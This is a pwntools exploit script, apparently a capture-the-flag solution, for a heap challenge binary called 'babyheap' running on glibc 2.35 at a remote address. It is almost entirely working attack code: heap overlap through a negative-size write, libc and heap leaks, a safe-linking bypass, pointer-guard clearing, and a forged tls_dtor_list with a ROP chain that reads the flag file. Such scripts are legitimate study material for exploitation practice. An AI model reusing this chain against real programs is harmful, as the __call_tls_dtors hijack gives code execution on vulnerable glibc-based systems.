#!/usr/bin/python3

from pwn import *

exe = ELF('./babyheap', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
libc.sym['fs'] = -0x28c0
context.binary = exe
context.log_level = 'debug'

infoaddr = lambda s: log.info(s)

def sla(msg, data):
	p.sendlineafter(msg, data)

def sa(msg, data):
	p.sendafter(msg, data)

def alloc(size, content):
	sla(b'Command: ', b'1')
	sla(b'Size: ', str(size).encode())
	sla(b'Content: ', content)

def update(idx, size, content):
	sla(b'Command: ', b'2')
	sla(b'Index: ', str(idx).encode())
	sla(b'Size: ', str(size).encode())
	sla(b'Content: ', content)

def delete(idx):
	sla(b'Command: ', b'3')
	sla(b'Index: ', str(idx).encode())

def view(idx):
	sla(b'Command: ', b'4')
	sla(b'Index: ', str(idx).encode())

def exit_program():
	sla(b'Command: ', b'5')

def left_rotate(data, bit):
	return (data << bit) | (data >> (64 - bit))

def GDB():
	gdb.attach(p, gdbscript='''
	b*0x555555555d0f
	b*0x55555555589f
	b*0x555555555b8c

	b*0x555555555d55

	b*0x155555330d80
	c
	''')

if args.LOCAL:
	p = process(exe.path)
else:
	p = remote('47.100.33.132', 2204)

###################################
### Stage 1: Overlapping chunks ###
###################################
alloc(0x18, b'0'*8)
alloc(0x4f8, b'1'*8)
alloc(0x18, b'2'*8)
alloc(0x4f8, b'3'*8)
alloc(0x18, b'4'*8)

payload = flat(
	0, 0,
	0, 0x521
	)
update(0, -1, payload)
delete(1)
delete(3)

##################################
### Stage 2: Leak libc address ###
##################################
alloc(0x4f8, b'1'*8)
view(2)
p.recvuntil(b'Chunk[2]: ')
libc_leak = u64(p.recv(8))
libc.address = libc_leak - 0x219ce0
infoaddr("Libc leak: " + hex(libc_leak))
infoaddr("Libc base: " + hex(libc.address))

##################################
### Stage 3: Leak heap address ###
##################################
alloc(0x18, b'3'*8)
delete(3)
view(2)
p.recvuntil(b'Chunk[2]: ')
heap_leak = u64(p.recv(8))
heap = heap_leak << 12
infoaddr("Heap leak: " + hex(heap_leak))
infoaddr("Heap base: " + hex(heap))

########################################
### Stage 4: __call_tls_dtors attack ###
########################################
### Stage 4.1: Clear __pointer_chk_guard_local
### https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/unix/sysv/linux/x86_64/sysdep.h#L394
alloc(0x18, b'3'*8)
delete(4)
delete(3)                          # Overlapping index 2
payload = flat(
	# Bypass safe linking
	((heap + 0x7c0) >> 12) ^ (libc.sym['fs'] + 0x30)
	)
update(2, 0x18, payload)

alloc(0x18, b'3'*8)
alloc(0x18, b'\x00'*8 + b'4'*8)    # The 8-byte '4' is note for index

### Stage 4.2: Create fake tls_dtor_list
### https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_thread_atexit_impl.c#L148
mov_rsp_rdx = libc.address + 0x000000000005a170
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address + 0x000000000002be51
pop_rdx_rbx = libc.address + 0x0000000000090529
pop_rax = libc.address + 0x0000000000045eb0
syscall = libc.address + 0x91396

### Create fake dtor_list
payload = flat(
	left_rotate(mov_rsp_rdx, 0x11), 0,
	0, heap + 0x800,

    # open("flag", 0, 0)
	pop_rax, 2,
	pop_rdi, heap + 0x7c0,
	pop_rsi, 0,
	pop_rdx_rbx, 0, 0,
	syscall,

    # read(3, heap+0x7c0, 0x100)
	pop_rax, 0,
	pop_rdi, 3,
	pop_rsi, heap+0x7c0,
	pop_rdx_rbx, 0x100, 0,
	syscall,

    # write(1, heap+0x7c0, 0x100)
	pop_rax, 1,
	pop_rdi, 1,
	syscall,
	)
alloc(0x4f8, payload)

### Overwrite tls_dtor_list
alloc(0x18, b'6'*8)
delete(6)
delete(3)
payload = flat(
	((heap + 0x7c0) >> 12) ^ (libc.sym['fs'] - 0x60)
	)
update(2, 0x18, payload)

alloc(0x18, b'flag\0\0\0\0')
alloc(0x18, b'6'*8 + p64(heap + 0x7e0))

exit_program()

p.interactive()